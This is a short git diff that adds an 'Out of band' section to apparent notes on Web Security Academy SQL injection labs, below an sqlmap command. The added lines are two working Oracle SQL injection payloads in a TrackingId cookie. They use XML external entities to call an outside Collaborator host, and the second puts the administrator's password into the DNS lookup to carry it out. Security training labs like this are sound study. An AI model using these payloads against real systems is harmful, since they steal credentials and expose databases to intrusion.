@@ -22,3 +22,12 @@ qlmap -u "https://0aef001c04d61b8e81771771008e0081.web-security-academy.net/filt
 ```
 
 
+# Out of band
+
+```bash
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//j4ouhbvxp3hdpkybcyx189hrbih85x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+```bash
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.j4ouhbvxp3hdpkybcyx189hrbih85x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
